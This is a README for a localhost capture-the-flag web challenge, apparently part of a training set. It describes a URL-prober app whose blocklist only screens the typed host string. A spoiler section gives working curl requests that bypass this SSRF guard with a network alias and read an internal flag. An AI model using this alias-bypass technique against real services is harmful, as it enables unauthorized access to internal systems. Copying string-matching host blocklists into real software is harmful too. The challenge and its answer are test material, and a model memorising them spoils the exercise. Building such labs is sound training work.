# w13 :: Gate Scan

- **Category:** Web
- **Difficulty:** medium
- **Stack:** Go / stdlib (2 containers)
- **URL:** http://localhost:30013

## Brief

GATE SCAN is an uptime prober: you give it a URL, it fetches the URL from
*inside* the network and hands you the response.

Beside it runs the **status farm** — a separate internal service that holds the
flag. The farm publishes no host port, so GATE SCAN is the only way to reach it.
A blocklist rejects any request whose host contains `internal`, which looks like
it closes the door.

## Goal

Fetch the farm's `/secret` through GATE SCAN and read the flag.

## Hint

Read the policy table on the landing page, then read the farm's own name. They
do not agree.

The guard screens the **host string you type**. It has no idea what that name
resolves to, and the farm has more than one.

<details>
<summary>Spoiler</summary>

`GET /api/health` reports the farm's current name:

```bash
curl -s http://localhost:30013/api/health
# {"service":"gate-scan", ..., "statusfarm_host":"statusfarm:9000"}
```

`statusfarm` is a network **alias** for the same container. The blocklist only
knows the canonical name `w0b-w13-internal`, which is correctly refused:

```bash
curl -s -X POST http://localhost:30013/scan \
  -H 'content-type: application/json' \
  -d '{"url":"http://w0b-w13-internal:9000/secret"}'
# {"error":"blocked: internal range"}
```

Ask for the alias instead — it resolves to the identical container and the guard
never matches it:

```bash
curl -s -X POST http://localhost:30013/scan \
  -H 'content-type: application/json' \
  -d '{"url":"http://statusfarm:9000/secret"}'
# {"body":"{\"flag\":\"hex4b0t{...}\"}\n","status":200,...}
```

See `solution/writeup.md`; `solution/probe.sh` asserts both that the blocklist
still blocks and that the alias gets through.

</details>
